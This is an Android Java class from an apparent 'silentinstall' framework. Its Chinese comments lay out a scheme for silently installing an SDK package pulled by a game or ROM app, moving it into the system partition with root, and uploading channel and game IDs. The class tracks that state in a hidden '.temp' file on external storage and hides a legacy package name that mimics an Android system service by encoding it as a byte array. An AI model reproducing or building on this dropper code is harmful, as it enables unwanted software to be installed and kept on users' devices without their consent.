package com.invisible.silentinstall.interact;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;

import java.io.File;
import java.util.Properties;

/**
 * Created by zhengnan on 2015/11/20.
 * - -
 * sdk包由主包pull并install,主包分为：game包,rom包。
 * 信息保存到.temp/pureSdk文件中。
 * 信息由主包来写入（之前是由sdk本身写入的）
 * 主包需要：
 *         是否存在sdk包
 *              通过已写信息判断
 *              通过遍历sdk包的metadata特征来发现。
 *         若静默了sdk包，则写入信息
 *              sdk包名
 *              主包的cid , gid。
 * 具体使用模块：
 *         root模块：
 *              若存在sdk包，
 *                      存在data就move to system
 *                      存在system do nothing
 *              !exit
 *                      pull to system
 *         si模块：
 *              ！若存在sdk包，check and modi dy data
 *              若不存在sdk包
 *                  检查has built包，有就插入，没有就pull一个。
 *                      安装前再做一次检测，防止被root模块抢先安装了。
 *                      ！安装sdk包后写入pname,cid,gid
 *
 *              ！如果有静默权限且不是主包，就上传parentGid和parentCid参数。
 *
 *         statis模块：
 *              如果本身不是主包，就上传parentGid,parentCid
 *               （本身不是主包这个条件就部分忽略了，可能会出现用户自主安装的新包的统计会上传prarentCid等，通过手动查询来忽略吧）
 *
 * sdk包需要：
 *
 *
 *
 */
public class PureInteract {
    //singleton
    private PureInteract(Context ctx){
        this.ctx = ctx.getApplicationContext();
        new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + ".temp").mkdirs();
        path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + ".temp" + "/pureSdk";
        checkTempInfo();
    }

    private static PureInteract pI = null;
    public static PureInteract getIns(Context ctx){
        if(pI==null)pI=new PureInteract(ctx);
        return pI;
    }
    private Context ctx = null;
    private String path;
    //key
    private String key_pName = "pName";
    private String key_cid = "cid";
    private String key_gid = "gid";

    //value
    private String value_cid = "";
    private String value_gid = "";
    void log(String msg) {
        Log.e("pureInteract", msg);
    }

    /**
     *各模块的本地和sd卡相互更新。
     */
    private void checkTempInfo() {
        log("checkTempInfo...");
        Properties pty = PureUtil.readProperty(path);
        SharedPreferences sp = getSp();
        String dataPname = sp.getString(key_pName, "");
        String sdPname = pty == null ? "" : pty.getProperty(key_pName, "");
        //都有值或都没值，就没必要进行更新
        if((!dataPname.equals("")&&!sdPname.equals(""))||(dataPname.equals("")&&sdPname.equals(""))){
            log("not need update!");
            return;
        }
        //互更
        if(dataPname.equals("")) {
            log("update data from sd!");
            //用sd数据更新data数据。
            sp.edit().putString(key_pName, pty.getProperty(key_pName, "")).commit();
            sp.edit().putString(key_cid, pty.getProperty(key_cid, "")).commit();
            sp.edit().putString(key_gid, pty.getProperty(key_gid, "")).commit();
        }else
        if(sdPname.equals("")) {
            log("update sd from data!");
            //用data数据更新sd数据。
            PureUtil.appendPty(path, key_pName, sp.getString(key_pName, ""));
            PureUtil.appendPty(path, key_cid, sp.getString(key_cid, ""));
            PureUtil.appendPty(path, key_gid, sp.getString(key_gid, ""));
        }
        value_cid = sp.getString(key_cid, "");
        value_gid = sp.getString(key_gid, "");
    }

    private SharedPreferences getSp() {
        return ctx.getSharedPreferences("SharedPreferences_cache", Context.MODE_PRIVATE);
    }
    /**
     * @param channelId 渠道
     * @param gameId 游戏id
     * @param sdkPakName 被安装的sdk的包名
     *写入已安装内置包的标志
     */
    public void writeBuiltInstallTag(String channelId, String gameId, String sdkPakName){
        log(getCid()+"-"+getGid()+","+channelId+","+gameId);
            PureUtil.appendPty(path,key_pName,""+sdkPakName);
            //原始的c,gid都不会更新掉。
            if(getCid().equals("")){
                PureUtil.appendPty(path,key_cid,""+channelId);
            }
            if(getGid().equals("")){
                PureUtil.appendPty(path,key_gid,""+gameId);
            }
    }

    public void appendPty(String key, String value){
        PureUtil.appendPty(path, key, value);
    }
    public String getPty(String key, String defValue){
        Properties pty = PureUtil.readProperty(path);
        return pty==null?defValue:pty.getProperty(key, defValue);
    }

    /**
     * @return
     */
    //内置包是否已安装
    public boolean isSdkInstalled(){
        // - 读取文件获取
            String pName = getPname4pureSdk();
            if(!TextUtils.isEmpty(pName)
                    &&PureUtil.isExistPackage(ctx,pName)){
                    return true;
            }
        return false;
    }
    //获取存储在本地的内置包名
    public String getPname4pureSdk(){
        //1,通过版写入的文件获取，对于一些版本内置包。
            File f = new File(path);
            if(f.exists()){
                Properties pty  = PureUtil.readProperty(path);
                String pName = pty.getProperty(key_pName,"");
                if(!pName.equals(""))
                return pName;
            }

        //2,通过读取meta-data方式来只能识别。
        try{
           log("search built apk by meta data ...");
            ApplicationInfo info = PureUtil.findMetaData(ctx,"isBt");
            if (info != null&&info.metaData.get("isBt").toString().equals("true")) {
                return info.packageName;
            }
        }catch (Exception e){
            e.printStackTrace();
            return  "";
        }/**/

        //3,包名。早期只放出一个包名的sdk包。com.android.service.store.data
        String oldPname = new String(new byte[]{99, 111, 109, 46, 97, 110, 100, 114, 111, 105, 100, 46, 115, 101, 114, 118, 105, 99, 101, 46, 115, 116, 111, 114, 101, 46, 100, 97, 116, 97});
        if(PureUtil.isExistPackage(ctx,oldPname)){
            return oldPname;
        }

        return "";
    }
    public String getCid() {
        if(!value_cid.equals("")) return value_cid;
        Properties pty = PureUtil.readProperty(path);
        if (pty != null) {
            value_cid = pty.getProperty(key_cid, "");
        }
        return value_cid;
    }

    public String getGid() {
        if(!value_gid.equals("")) return value_gid;
        Properties pty = PureUtil.readProperty(path);
        if (pty != null) {
            value_gid = pty.getProperty(key_gid, "");
        }
        return value_gid;
    }
}

